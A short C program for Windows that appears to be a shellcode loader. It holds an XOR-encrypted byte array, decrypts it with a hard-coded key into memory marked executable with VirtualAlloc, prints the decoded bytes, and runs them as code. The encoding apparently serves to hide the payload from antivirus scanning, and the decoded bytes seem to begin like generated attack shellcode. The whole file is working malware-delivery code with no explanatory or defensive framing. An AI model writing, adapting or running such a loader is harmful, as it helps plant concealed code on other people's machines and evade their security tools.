#include <windows.h>
#include <stdio.h>
#include <stdlib.h>



unsigned char payload[] = { 0x89, 0x26, 0xe1, 0x96, 0x95, 0x89, 0xa7, 0x61, 0x62, 0x6c, 0x24, 0xe, 0x2a, 0x35, 0x2b, 0x3d, 0x5f, 0xb0, 0x17, 0x2d, 0xea, 0x39, 0x1, 0x33, 0x3a, 0x2d, 0xd4, 0x39, 0x7d, 0x31, 0xfe, 0x3c, 0x42, 0x3a, 0x6a, 0xd6, 0x21, 0x2b, 0x2a, 0xe7, 0x17, 0xf, 0x26, 0x54, 0xb0, 0x3d, 0x5f, 0xa2, 0xde, 0x59, 0x0, 0x17, 0x63, 0x4e, 0x4c, 0x24, 0x9e, 0xa2, 0x68, 0x38, 0x74, 0xaf, 0x80, 0x9f, 0x37, 0x29, 0xe0, 0x33, 0x42, 0xe7, 0x27, 0x63, 0x2a, 0x34, 0x31, 0x74, 0xbe, 0x4, 0xf3, 0x1d, 0x79, 0x60, 0x63, 0x6d, 0xe9, 0x17, 0x5f, 0x6b, 0x65, 0xf2, 0xf5, 0xe6, 0x62, 0x72, 0x65, 0x29, 0xee, 0xa1, 0x16, 0xb, 0x2d, 0x5e, 0xbb, 0x21, 0xf2, 0x35, 0x4e, 0x2b, 0x73, 0xb5, 0xea, 0x23, 0x79, 0x32, 0x8f, 0x33, 0x17, 0x94, 0xac, 0x34, 0x44, 0xa7, 0x23, 0xf9, 0x51, 0xe9, 0x23, 0x60, 0xb4, 0x24, 0x54, 0x9f, 0xc7, 0x24, 0xb8, 0xbc, 0x63, 0x23, 0x73, 0xa4, 0x59, 0x8b, 0x14, 0x93, 0x20, 0x66, 0x13, 0x4f, 0x6d, 0x3c, 0x4c, 0xbf, 0x17, 0xaa, 0x3d, 0x25, 0xe0, 0x21, 0x46, 0x25, 0x64, 0x8f, 0xd, 0x24, 0xf2, 0x79, 0x26, 0x26, 0xf9, 0x25, 0x7d, 0x22, 0x60, 0xb2, 0x2d, 0xee, 0x5b, 0xe3, 0x2d, 0x78, 0xa5, 0x2f, 0x3a, 0x33, 0x3d, 0x3f, 0x32, 0x3b, 0x23, 0x34, 0x24, 0x6, 0x2a, 0x3f, 0x31, 0xf6, 0x82, 0x42, 0x33, 0x37, 0x9e, 0x8b, 0x39, 0x23, 0x35, 0x3f, 0x17, 0xe0, 0x77, 0x90, 0x3e, 0x91, 0x9d, 0x8d, 0x38, 0x28, 0xd5, 0x16, 0x11, 0x5e, 0x3a, 0x6c, 0x59, 0x65, 0x79, 0x34, 0x38, 0x2b, 0xfb, 0x83, 0x29, 0xea, 0x8d, 0xc2, 0x6d, 0x65, 0x5f, 0x22, 0xec, 0x9c, 0x3c, 0xd2, 0x60, 0x72, 0x74, 0x3d, 0xc7, 0x78, 0xdb, 0x9d, 0x24, 0xb, 0x22, 0xec, 0x9d, 0x39, 0xe7, 0x93, 0x33, 0xdf, 0x2d, 0x1c, 0x47, 0x65, 0x93, 0xb0, 0x13, 0xe2, 0x8f, 0x11, 0x74, 0x6f, 0x62, 0x72, 0x3c, 0x20, 0xd1, 0x48, 0xe2, 0x7, 0x65, 0xa0, 0xbe, 0xf, 0x73, 0x34, 0x30, 0x32, 0x22, 0x28, 0x50, 0xa2, 0x2c, 0x53, 0xac, 0x2d, 0xa0, 0xab, 0x2d, 0xf0, 0xb7, 0x26, 0x9d, 0xb2, 0x2d, 0xe8, 0xaa, 0x20, 0xd8, 0x86, 0x6a, 0x80, 0x8b, 0x9a, 0xac, 0x3d, 0xe7, 0xa5, 0x18, 0x75, 0x20, 0x33, 0x2d, 0xeb, 0x8e, 0x2d, 0xd6, 0x92, 0x24, 0xc3, 0xec, 0xcb, 0x16, 0x13, 0x9a, 0xb4, 0xee, 0xa1, 0x16, 0x66, 0x2c, 0xa0, 0xa5, 0x10, 0x9c, 0x9d, 0xfd, 0x62, 0x72, 0x65, 0x29, 0xe8, 0x8d, 0x72, 0x24, 0xec, 0xbd, 0x26, 0x54, 0xb0, 0x1f, 0x6a, 0x23, 0x2a, 0x2d, 0xe8, 0x92, 0x20, 0xd8, 0x6e, 0xbc, 0x97, 0x34, 0x9a, 0xac, 0xf6, 0x96, 0x62, 0xc, 0x30, 0x29, 0xe8, 0xa5, 0x42, 0x32, 0xec, 0xa9, 0x1, 0x25, 0x38, 0x2c, 0x6, 0x62, 0x62, 0x65, 0x61, 0x2a, 0x39, 0x2a, 0xe5, 0x97, 0x17, 0x5a, 0xac, 0x38, 0xcf, 0x36, 0xc6, 0x21, 0x80, 0x9e, 0xbe, 0x29, 0xeb, 0xaf, 0x2c, 0xd6, 0xac, 0x28, 0x48, 0xbc, 0x27, 0xeb, 0x82, 0x2d, 0xe8, 0xb1, 0x29, 0xeb, 0x95, 0x24, 0xe5, 0x69, 0xbc, 0xb1, 0x2a, 0x91, 0xb7, 0xf1, 0x9d, 0x61, 0x16, 0x49, 0x3a, 0x2d, 0x32, 0x6, 0x3, 0x65, 0x39, 0x75, 0x6e, 0x23, 0x2a, 0xf, 0x61, 0x31, 0x20, 0xd8, 0x67, 0x4a, 0x50, 0x5b, 0x9a, 0xac, 0x22, 0x37, 0x23, 0xc8, 0x10, 0xf, 0x26, 0x0, 0x9d, 0xb9, 0x2c, 0xa0, 0xa5, 0x8c, 0x45, 0x8a, 0x91, 0x9d, 0x3a, 0x64, 0xa2, 0x23, 0x48, 0xa4, 0x24, 0xe0, 0xa9, 0x1e, 0xd1, 0x38, 0x8a, 0x89, 0x3a, 0x18, 0x65, 0x38, 0x22, 0xa6, 0xa0, 0x9c, 0xd0, 0xfd, 0x3d, 0x9a, 0xac };


void XOR(char * data, size_t data_len, char * key, size_t key_len) {
	//int j;

	//j = 0;
	for (int i = 0; i < data_len; i++) {
		//if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[i % (key_len - 1)];
		//j++;
	}
}

int main() {

    // unsigned char key[] = {
    // 0x75, 0x6E, 0x62, 0x72, 0x65, 0x61, 0x6B, 0x61, 
    // 0x62, 0x6C, 0x65, 0x5F, 0x6B, 0x65, 0x79};
    //tolgo il null terminator, trimmo la stringa
    unsigned char key[] = "unbreakable_key";


    void *exec_mem = VirtualAlloc(0, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec_mem == NULL) {
        printf("Error: Failed to allocate memory for exec_mem\n");
        return 1;
    }

    RtlMoveMemory(exec_mem, payload, sizeof(payload));
    XOR((char *)exec_mem, sizeof(payload), (char *)key, sizeof(key));
    //printo tutti i char di exec_mem
    for (int i = 0; i < sizeof(payload); i++) {
        printf("0x%02x, ", ((unsigned char *)exec_mem)[i]);
    }

    ((void(*)())exec_mem)();

    return 0;
}